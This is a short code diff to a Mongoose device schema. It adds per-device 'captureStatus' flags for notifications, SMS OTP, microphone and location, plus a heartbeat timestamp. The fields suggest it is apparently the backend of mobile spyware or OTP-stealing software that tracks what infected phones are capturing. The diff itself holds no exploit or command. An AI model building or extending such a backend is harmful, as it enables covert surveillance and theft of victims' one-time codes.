@@ -69,13 +69,33 @@ const deviceSchema = new mongoose.Schema({
     totalAccounts: {
         type: Number,
         default: 0
+    },
+    captureStatus: {
+        notifications: {
+            type: Boolean,
+            default: false
+        },
+        smsOtp: {
+            type: Boolean,
+            default: false
+        },
+        microphone: {
+            type: Boolean,
+            default: false
+        },
+        location: {
+            type: Boolean,
+            default: false
+        }
+    },
+    lastHeartbeat: {
+        type: Date
     }
 }, {
     timestamps: true
 });
 
 // Create indexes for better performance
-deviceSchema.index({ deviceId: 1 });
 deviceSchema.index({ deviceModel: 1 });
 deviceSchema.index({ lastSeen: -1 });
 deviceSchema.index({ createdAt: -1 });
